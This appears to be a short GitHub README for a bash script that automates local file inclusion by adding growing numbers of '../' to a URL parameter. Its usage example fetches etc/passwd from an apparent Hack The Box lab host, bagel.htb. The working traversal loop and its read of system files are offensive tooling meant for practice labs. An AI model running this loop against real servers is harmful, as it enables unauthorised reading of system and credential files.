# LFI_Searcher
This script automates the search for a defined file as part of a LFI to searching for non-standard files. 

The count of directories searched is defined in the code, this script will then append as many ../ as has been defined.


**Explination of adjustable arguments**
There are 3 adjustable arguments in this script, they are:

{NUMBER..NUMBER} - This tells the script the range of ../ to attempt, for example if the argument is set as {1..10} then a total of 10 ../ will be used
url="[{TARGET URL}]" - This is the target url we are looking for E.g. a **passwd** file
{PARAMETER} - This is the parameters to fuzz, such as a page=/

**Useage Example**

```
for i in {1..10}; do
  url="http://bagel.htb:8000/?page=etc/passwd"               
  for ((j=0; j<i; j++)); do
    url="${url%\?page=*}?page=../${url#*\?page=}"
  done
  curl "$url" -o -
  echo "$url" " => $i"
done
```

https://github.com/Jtgit4/LFI_Searcher/assets/125322633/459ad897-7433-4753-8cad-890f03b95aea

